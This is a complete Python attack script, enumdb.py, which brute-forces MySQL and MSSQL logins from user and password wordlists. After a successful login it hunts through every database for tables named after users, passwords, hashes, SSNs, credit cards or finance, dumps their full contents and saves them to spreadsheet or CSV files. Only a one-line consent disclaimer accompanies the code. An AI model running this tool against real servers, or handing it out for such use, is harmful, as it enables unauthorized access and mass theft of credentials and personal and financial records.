#!/usr/bin/env python3

# Author: m8r0wn
# Script: enumdb.py

# Disclaimer:
# This tool was designed to be used only with proper
# consent. Use at your own risk.

import MySQLdb
import pymssql
import openpyxl
import sys
import os

def banner():
    print("""
                        enumdb.py
       -----------------------------------------
Brute force MySQL or MSSQL database logins. Once provided with valid
credentials, enumdb will attempt to enumerate tables containing
sensitive information such as: users, passwords, ssn, etc.

Options:
    -u          Username value
    -U          user.txt file

    -p          Password value
    -P          Pass.txt file

    -t         Database type: mssql, mysql
    -port      Specify Non-standard port

    -brute     Brute force only, do not enumerate
    -csv       CSV output file (default: xlsx)

python3 enumdb.py -u root -p '' -t mysql 10.11.1.30
python3 enumdb.py -u 'domain\\user1 -P pass.txt -t mssql 192.168.1.7

Having trouble with inputs? Use '' around username & password
    """)
    sys.exit(0)

class create_xlsx():
    def __init__(self, outfile, host, dbtype):
        self.outfile = outfile
        self.create_workbook()
        self.create_overview(host, dbtype)

    def create_workbook(self):
        self.wb = openpyxl.Workbook()

    def save_workbook(self, filename):
        self.wb.save(filename)  # save new workbook

    def create_overview(self, host, dbtype):
        #Create enum overview on sheet1
        self.ws0 = self.wb.active
        self.ws0.title = "Overview"
        self.ws0['A1'] = "Target:"
        self.ws0['B1'] = host
        self.ws0['A2'] = "DB Type:"
        self.ws0['B2'] = dbtype
        self.ws0['A4'] = "DB"
        self.ws0['B4'] = "Table"
        self.ws0['C4'] = "Key Word"
        self.sheet1_row = 5

    def addto_overview(self, db, table, keyword):
        #Add db,table,and keyword to sheet1
        self.ws0.cell(row=self.sheet1_row, column=1, value=str(db))
        self.ws0.cell(row=self.sheet1_row, column=2, value=str(table))
        self.ws0.cell(row=self.sheet1_row, column=3, value=str(keyword))
        self.sheet1_row += 1

    def create_sheet(self, db, table, header, data):
        #Create new sheet for each table and add table data
        ws = self.wb.create_sheet(table[0:15])
        row_count = 1
        col_count = 1
        ws['A1'] = "[+] Enumerating:  {}.{}".format(db, table)
        row_count += 1
        for x in header:
            ws.cell(row=row_count, column=col_count, value=str(x[0]))
            col_count += 1
        col_count = 1
        row_count += 1
        for row in data:
            for item in row:
                ws.cell(row=row_count, column=col_count, value=str(item))
                col_count += 1
            col_count = 1
            row_count += 1
        self.save_workbook(self.outfile)

class enum_db():
    #Terms to search for in table name (all lowercase)
    search_tables = ['user', 'users','login','logon','config','hr',
                 'finance','cash', 'account','accounts','password',
                 'passwords', 'passwd','hash','hashes','ssn','cc',
                 'credit_cards', 'creditcards','credit cards',
                 'social', 'socials']

    def __init__(self):
        self.generate_searchwords()

    def generate_searchwords(self):
        #create variations of lower case table names
        count = 0
        list_len = len(self.search_tables)
        while count != list_len:
            self.search_tables.append(self.search_tables[count].title())
            self.search_tables.append(self.search_tables[count].upper())
            count += 1

    def db_connect(self, dbtype, host, port, user, passwd):
        try:
            if dbtype == "mysql":
                con = MySQLdb.connect(host=host, port=port, user=user, password=passwd, connect_timeout=3)
                con.query_timeout = 20
            elif dbtype == "mssql":
                con = pymssql.connect(server=host, port=port, user=user, password=passwd, login_timeout=3, timeout=3)
            print_success("Connection Established {}:{}@{}".format(user,passwd,host))
            return con
        except:
            print_failure("Login to {}:{}@{} failed.".format(user,passwd,host))
            return False

    def db_query(self,con, cmd):
        cur = con.cursor()
        cur.execute(cmd)
        data = cur.fetchall()
        cur.close()
        return data

    def db_closing(self,count, host):
        if count > 0:
            print_status("{} tables enumerated for {}".format(count, host))
        else:
            print_failure("{} table(s) enumerated for {}".format(count, host))
        print_status("Closing\n")
        sys.exit(0)

    def mysql_enum(self, con, outfile, host, dbtype, excel):
        table_count = 0
        for database in self.db_query(con, "show databases;"):
            self.db_query(con, "use {};".format(database[0]))
            for table in self.db_query(con, "show tables;"):
                complete_tables = []
                for t in self.search_tables:
                    if t in table[0] and table[0] not in complete_tables:
                        complete_tables.append(table[0])
                        header = self.db_query(con, "SHOW COLUMNS FROM {}".format(table[0]))
                        data = self.db_query(con, "SELECT * FROM {}".format(table[0]))
                        if data and excel: #Write to xlsx
                            if table_count == 0:
                                #Create xlsx workbook on first found data
                                xlsx = create_xlsx(outfile, host, dbtype)
                            print_success("Enumerating {}:{}".format(database[0], table[0]))
                            xlsx.addto_overview(database[0], table[0], t)
                            xlsx.create_sheet(database[0], table[0], header, data)
                            table_count += 1
                        elif data: #Write to csv
                            write_csv(outfile, header, data, database[0], table[0])
                            table_count += 1
                        else:
                            print_empty('Empty data set {}:{}'.format(database[0], table[0]))
        con.close()
        self.db_closing(table_count, host)

    def mssql_enum(self,con, outfile, host, dbtype, excel):
        table_count = 0
        for database in self.db_query(con, "SELECT NAME FROM sys.Databases;"):
            for table in self.db_query(con, "SELECT NAME FROM {}.sys.tables;".format(database[0])):
                complete_tables = []
                for t in self.search_tables:
                    if t in table[0] and table[0] not in complete_tables:
                        complete_tables.append(table[0])
                        header = self.db_query(con, "USE {};SELECT column_name FROM information_schema.columns WHERE table_name = '{}';".format(database[0],table[0]))
                        data = self.db_query(con, "SELECT * FROM {}.dbo.{};".format(database[0],table[0]))
                        if data and excel: #Write to xlsx
                            if table_count == 0:
                                #Create xlsx workbook on first found data
                                xlsx = create_xlsx(outfile, host, dbtype)
                            print_success("Enumerating {}:{}".format(database[0], table[0]))
                            xlsx.addto_overview(database[0], table[0], t)
                            xlsx.create_sheet(database[0], table[0], header, data)
                            table_count += 1
                        elif data: #Write to csv
                            write_csv(outfile, header, data, database[0], table[0])
                            table_count += 1
                        else:
                            print_empty('Empty data set {}:{}'.format(database[0], table[0]))
        con.close()
        self.db_closing(table_count, host)

def write_csv(outfile, header, data, database, table):
    # After table enumeration, write to csv
    print_success("Enumerating {}:{}".format(database, table))
    write_file(outfile, "[+] Enumerating {}:{}\n".format(database, table))
    for x in header:
        write_file(outfile, "{},".format(x[0]))
    write_file(outfile, "\n")
    data_count = 0
    while data_count != len(data):
        for y in data[data_count]:
            write_file(outfile, "{},".format(y))
        data_count += 1
        write_file(outfile, "\n")
    write_file(outfile, "\n\n\n")

def outfile_prep(file):
    #check if file exists and prompt user to delete
    if os.path.exists(file):
        print("\n");print_failure("Output file '{}' exists in current directory.".format(file))
        delete_old = input("\033[1;34m[*]\033[1;m Do you want to delete and continue? [y/N]: ")
        if delete_old not in ['y', 'Y']:
            sys.exit(0)
        os.remove(file)
    return file

def write_file(file, data):
    if os.path.exists(file):
        option = 'a'
    else:
        option = 'w'
    OpenFile = open(file, option)
    OpenFile.write('%s' % (data))
    OpenFile.close()

def print_success(msg):
    print('\033[1;32m[+]\033[1;m', msg)

def print_status(msg):
    print('\033[1;34m[*]\033[1;m', msg)

def print_failure(msg):
    print('\033[1;31m[-]\033[1;m', msg)

def print_empty(msg):
    print('\033[1;33m[-]\033[1;m', msg)

def get_val(flag):
    return sys.argv[sys.argv.index(flag) + 1]

def parse_args():
    args = {}
    try:
        #host
        args['host'] = sys.argv[-1]
        #Username
        try:
            args['users'] = [line.strip() for line in open(get_val('-U'))]
        except:
            args['users'] = [get_val('-u')]
        #Password
        try:
            args['passwd'] = [line.strip() for line in open(get_val('-P'))]
        except:
            args['passwd'] = [get_val('-p')]
        #dbtype
        args['dbtype'] = get_val('-t')
        #port
        try:
            args['port'] = int(get_val("-P"))
        except:
            if args['dbtype'] == 'mysql':
                args['port'] = 3306
            elif args['dbtype'] == 'mssql':
                args['port'] = 1433
        #brute option
        args['enum'] = True
        if '-brute' in sys.argv:
            args['enum'] = False
        #output type
        args['excel'] = True
        args['file_ext'] = 'xlsx'
        if '-csv' in sys.argv:
            args['excel'] = False
            args['file_ext'] = 'csv'
        return args
    except Exception as e:
        print_failure("Error parsing user input: {}".format(e))
        sys.exit(0)

def main():
    if "-h" in sys.argv or len(sys.argv) == 1:
        banner()
    try:
        args = parse_args()
        print_status("Starting enumdb.py")
        scan = enum_db()
        for user in args['users']:
            for passwd in args['passwd']:
                con = scan.db_connect(args['dbtype'], args['host'], args['port'], user, passwd)
                if con and args['enum']:
                    if args['dbtype'] == "mysql":
                        scan.mysql_enum(con, outfile_prep("{}_enumdb.{}".format(args['host'], args['file_ext'])), args['host'], args['dbtype'], args['excel'])
                    elif args['dbtype'] == 'mssql':
                        scan.mssql_enum(con, outfile_prep("{}_enumdb.{}".format(args['host'], args['file_ext'])), args['host'], args['dbtype'], args['excel'])
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        sys.exit(0)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        sys.exit(0)